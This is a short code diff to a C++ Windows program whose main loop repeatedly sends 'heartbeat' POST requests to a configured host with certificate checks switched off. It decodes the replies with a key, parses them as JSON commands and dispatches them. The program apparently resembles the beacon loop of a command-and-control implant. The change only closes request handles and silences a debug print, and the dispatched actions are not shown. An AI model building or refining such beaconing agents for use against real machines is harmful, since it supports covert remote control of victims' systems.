@@ -12,12 +12,15 @@ void mainloop() {
 	HANDLE hConnect = InternetConnectA(hInternet, c.hostname.c_str(), c.port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
 	HttpEndRequestA(hRequest, NULL, NULL, NULL);
+	if(hRequest)
+		InternetCloseHandle(hRequest);
 
 	while (true) {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
 		std::string response = sendRequestGetResponse(hRequest);
 		response = decode(c.key, response);
-		std::cout << response << "\n";
+		//std::cout << response << "\n";
+		// Attempt to parse decoded string as JSON, generate hash of action string
 		nlohmann::json parsed;
 		long code;
 		try {
@@ -75,7 +78,10 @@ void mainloop() {
 		default:
 			break;
 		}
+		
 		HttpEndRequestA(hRequest, NULL, NULL, NULL);
+		if(hRequest)
+			InternetCloseHandle(hRequest);
 		Sleep(c.sleeptime);
 	}
 	return;
